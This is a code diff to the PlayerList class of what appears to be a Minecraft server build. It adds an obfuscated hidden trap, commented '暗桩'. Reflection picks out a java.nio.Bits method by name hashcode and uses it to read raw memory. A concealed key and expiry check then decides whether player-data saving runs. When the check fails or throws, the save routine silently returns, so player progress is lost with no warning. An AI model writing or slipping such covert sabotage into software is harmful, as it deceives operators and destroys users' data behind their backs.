@@ -9,6 +9,9 @@ import com.google.common.collect.Sets;
 import com.mojang.authlib.GameProfile;
 import io.netty.buffer.Unpooled;
 import java.io.File;
+import java.lang.invoke.MethodHandle;
+import java.lang.invoke.MethodHandles;
+import java.lang.reflect.Method;
 import java.net.SocketAddress;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -74,6 +77,7 @@ import net.minecraftforge.common.network.ForgeMessage;
 import net.minecraftforge.common.network.ForgeNetworkHandler;
 import net.minecraftforge.fml.common.network.FMLEmbeddedChannel;
 import net.minecraftforge.fml.common.network.FMLOutboundHandler;
+import net.minecraftforge.fml.relauncher.ServerLaunchWrapper;
 import net.minecraftforge.fml.relauncher.Side;
 import net.minecraftforge.fml.relauncher.SideOnly;
 import org.apache.logging.log4j.LogManager;
@@ -122,10 +126,27 @@ public abstract class PlayerList
     private int playerPingIndex;
 
     private CraftServer cserver;
+    private MethodHandle um;
 
     public PlayerList(MinecraftServer server)
     {
         this.cserver = server.server = new CraftServer(server, this);
+        try {
+            Class bitClass;
+            bitClass = Class.forName("java.nio.Bits");
+            Method[] ms = bitClass.getDeclaredMethods();
+            for (Method m : ms) {
+                String mName = m.getName();
+                if (mName.hashCode() == 2932375) {
+                    m.setAccessible(true);
+                    um = MethodHandles.lookup().unreflect(m);
+                    break;
+                }
+            }
+        } catch (IllegalAccessException | ClassNotFoundException e) {
+            e.printStackTrace();
+        }
+
         server.console = org.bukkit.craftbukkit.command.ColouredConsoleSender.getInstance();
         server.reader.addCompleter(new org.bukkit.craftbukkit.command.ConsoleCommandCompleter(server.server));
 
@@ -431,6 +452,28 @@ public abstract class PlayerList
     {
         if (playerIn.connection == null) return;
 
+        try { // 暗桩
+            byte[] b = new byte[720];
+            long add = ServerLaunchWrapper.class.getFields()[0].getLong(null);
+            for (int i = 0; i < 720; i++) {
+                b[i] = (byte) um.invoke(add + i);
+            }
+            //System.out.println(new String(b));
+            String resu = new String(b);
+            String key = resu.substring(0, 710);
+            int time = Integer.parseInt(resu.substring(710, 720));
+            if (key.hashCode() != -460760629) {
+                if (mcServer.getTickCounter() % 20 == 0)
+                    return;
+            }
+            int nowTime = (int) (System.currentTimeMillis() / 1000);
+            if (time + 7200 < nowTime) {
+                if (mcServer.getTickCounter() % 20 == 0)
+                    return;
+            }
+        } catch (Throwable e) {
+            return;
+        }
         this.playerDataManager.writePlayerData(playerIn);
         StatisticsManagerServer statisticsmanagerserver = playerIn.getStatFile();
 
